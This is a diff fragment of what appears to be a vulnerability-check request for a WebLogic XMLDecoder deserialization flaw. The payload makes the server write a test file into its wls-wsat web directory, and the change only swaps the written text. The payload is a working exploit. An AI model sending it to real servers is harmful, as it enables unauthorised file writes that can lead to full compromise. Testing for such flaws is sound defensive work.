@@ -25,7 +25,7 @@ Content-Length: 756
          <java version="1.6.0" class="java.beans.XMLDecoder">
                     <object class="java.io.PrintWriter"> 
                         <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
-                        <string>xmldecoder_vul_test</string></void><void method="close"/>
+                        <string>hello_world</string></void><void method="close"/>
                     </object>
             </java>
         </work:WorkContext>
